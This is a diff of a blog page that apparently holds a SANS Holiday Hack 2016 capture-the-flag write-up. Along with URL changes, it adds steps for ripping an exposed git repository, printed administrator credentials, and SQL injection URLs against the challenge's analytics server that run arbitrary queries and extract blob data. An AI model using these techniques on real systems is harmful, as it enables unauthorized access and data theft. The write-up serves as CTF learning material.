@@ -18,10 +18,10 @@
     <meta property="og:type" content="article" />
     <meta property="og:title" content="SANS Holiday Hack 2016" />
     <meta property="og:description" content="Part 1: A Most Curious Business Card 1: What is the secret message in Santa&#x27;s tweets? Answer: bugbounty Solution: Load all tweets, open developer tools, and turn on preserve log   $(&quot;div.js-tweet-text-container&quot;).text(); 2: What is inside the ZIP file distributed by Santa&#x27;s team? Answer: SantaGram_v4.2.apk Solution:" />
-    <meta property="og:url" content="https://stefanscherer.github.io/sans-holiday-hack-2016/" />
-    <meta property="og:image" content="https://stefanscherer.github.io/content/images/2017/01/sans_2016.png" />
+    <meta property="og:url" content="http://blog.elauqsap.com/sans-holiday-hack-2016/" />
+    <meta property="og:image" content="http://blog.elauqsap.com/content/images/2017/01/sans_2016.png" />
     <meta property="article:published_time" content="2017-01-06T07:31:58.000Z" />
-    <meta property="article:modified_time" content="2017-01-12T05:23:38.000Z" />
+    <meta property="article:modified_time" content="2017-01-12T07:22:00.000Z" />
     <meta property="article:tag" content="SANS" />
     <meta property="article:tag" content="pentest" />
     <meta property="article:tag" content="CTF" />
@@ -30,8 +30,8 @@
     <meta name="twitter:card" content="summary_large_image" />
     <meta name="twitter:title" content="SANS Holiday Hack 2016" />
     <meta name="twitter:description" content="Part 1: A Most Curious Business Card 1: What is the secret message in Santa&#x27;s tweets? Answer: bugbounty Solution: Load all tweets, open developer tools, and turn on preserve log   $(&quot;div.js-tweet-text-container&quot;).text(); 2: What is inside the ZIP file distributed by Santa&#x27;s team? Answer: SantaGram_v4.2.apk Solution:" />
-    <meta name="twitter:url" content="https://stefanscherer.github.io/sans-holiday-hack-2016/" />
-    <meta name="twitter:image" content="https://stefanscherer.github.io/content/images/2017/01/sans_2016.png" />
+    <meta name="twitter:url" content="http://blog.elauqsap.com/sans-holiday-hack-2016/" />
+    <meta name="twitter:image" content="http://blog.elauqsap.com/content/images/2017/01/sans_2016.png" />
     <meta name="twitter:label1" content="Written by" />
     <meta name="twitter:data1" content="Pasquale D&#x27;Agostino" />
     <meta name="twitter:label2" content="Filed under" />
@@ -46,7 +46,7 @@
     "publisher": {
         "@type": "Organization",
         "name": "thought|pipe",
-        "logo": "https://stefanscherer.github.io/ghost/img/ghosticon.jpg"
+        "logo": "http://blog.elauqsap.com/ghost/img/ghosticon.jpg"
     },
     "author": {
         "@type": "Person",
@@ -57,16 +57,16 @@
             "width": 250,
             "height": 250
         },
-        "url": "https://stefanscherer.github.io/author/pasquale/",
+        "url": "http://blog.elauqsap.com/author/pasquale/",
         "sameAs": []
     },
     "headline": "SANS Holiday Hack 2016",
-    "url": "https://stefanscherer.github.io/sans-holiday-hack-2016/",
+    "url": "http://blog.elauqsap.com/sans-holiday-hack-2016/",
     "datePublished": "2017-01-06T07:31:58.000Z",
-    "dateModified": "2017-01-12T05:23:38.000Z",
+    "dateModified": "2017-01-12T07:22:00.000Z",
     "image": {
         "@type": "ImageObject",
-        "url": "https://stefanscherer.github.io/content/images/2017/01/sans_2016.png",
+        "url": "http://blog.elauqsap.com/content/images/2017/01/sans_2016.png",
         "width": 2841,
         "height": 1862
     },
@@ -74,7 +74,7 @@
     "description": "Part 1: A Most Curious Business Card 1: What is the secret message in Santa&#x27;s tweets? Answer: bugbounty Solution: Load all tweets, open developer tools, and turn on preserve log   $(&quot;div.js-tweet-text-container&quot;).text(); 2: What is inside the ZIP file distributed by Santa&#x27;s team? Answer: SantaGram_v4.2.apk Solution:",
     "mainEntityOfPage": {
         "@type": "WebPage",
-        "@id": "https://stefanscherer.github.io"
+        "@id": "http://blog.elauqsap.com"
     }
 }
     </script>
@@ -871,7 +871,7 @@
                 </section>
             </header>
             <figure class="post-image">
-                <amp-img src="https://stefanscherer.github.io/content/images/2017/01/sans_2016.png" width="600" height="400" layout="responsive"></amp-img>
+                <amp-img src="http://blog.elauqsap.com/content/images/2017/01/sans_2016.png" width="600" height="400" layout="responsive"></amp-img>
             </figure>
             <section class="post-content">
 
@@ -1064,6 +1064,9 @@ Activating the train allows you to travel back in time to the North Pole circa 1
 
 <p>The Dungeon Game</p>
 
+<pre><code>Incomplete
+</code></pre>
+
 <p>The Debug Server</p>
 
 <pre><code>Incomplete
@@ -1164,15 +1167,36 @@ curl -vH &quot;Content-Type: application/json&quot; -d '{&quot;data&quot;:{&quot
 |_  http/1.1
 </code></pre>
 
-<p>Downloading the git repository gives a corrupted instance of the code base. After using this <a href="https://github.com/kost/dvcs-ripper">tool</a>, I was able to get the source code. Looking through the git log I noticed mention of authentication updates. Checking out <code>5f0c135e1479d865945577c0a70d0cf39e49cdc7</code> provides administrator credentials that are still valid in <code>sprusage.sql</code>.</p>
+<p>Downloading the git repository gives a corrupted instance of the code base. After using this <a href="https://github.com/kost/dvcs-ripper">tool</a>, I was able to get the source code. Looking through the git log I noticed mention of authentication updates. </p>
 
 <pre><code class="language-bash">./rip-git.pl -s -v -u https://analytics.northpolewonderland.com/.git/
 git log  
 git checkout 5f0c135e1479d865945577c0a70d0cf39e49cdc7  
 </code></pre>
 
+<p>Checking out <code>5f0c135e1479d865945577c0a70d0cf39e49cdc7</code> provides administrator credentials that are still valid in <code>sprusage.sql</code>.</p>
+
 <pre><code class="language-sql">INSERT INTO `users` VALUES (0,'administrator','KeepWatchingTheSkies'),(1,'guest','busyllama67');  
 </code></pre>
+
+<p>After logging in with the administrator credentials we see that we now can perform edits. Performing a blank query for usage gives us a UUID that we can attempt to edit.</p>
+
+<p><amp-img src="http://blog.elauqsap.com/content/images/2017/01/spru-query-2.jpeg" alt width="2176" height="372" layout="responsive"></amp-img></p>
+
+<p>It seems to be looping for the submitted parameters and building a SQL query. So can we just submit the query parameter in the URL with some arbitrary query?</p>
+
+<pre><code class="language-language bash">https://analytics.northpolewonderland.com/edit.php?id=9dbdf565-ebf7-4e9d-a12a-9b165ff3d818&amp;name=the&amp;description=donald&amp;query=select%20*%20from%20audio  
+</code></pre>
+
+<p><amp-img src="http://blog.elauqsap.com/content/images/2017/01/spru-sqli.jpeg" alt width="2272" height="410" layout="responsive"></amp-img>
+<amp-img src="http://blog.elauqsap.com/content/images/2017/01/squ-proof.jpeg" alt width="2298" height="786" layout="responsive"></amp-img></p>
+
+<p>The column <code>mp3</code> isn't showing and appears to be blob data from the schema discovered in the git repository. Modifying the query to use <code>to_base64()</code> on <code>mp3</code> allows for extraction of the audio file.</p>
+
+<pre><code class="language-bash">https://analytics.northpolewonderland.com/edit.php?id=9dbdf565-ebf7-4e9d-a12a-9b165ff3d818&amp;name=the&amp;description=donald&amp;query=select%20filename,to_base64(mp3)%20from%20audio  
+</code></pre>
+
+<p>Use <code>| base64 --decode &gt; discombobulatedaudio7.mp3</code> to decode the text and get the audio file.</p>
 
             </section>
 
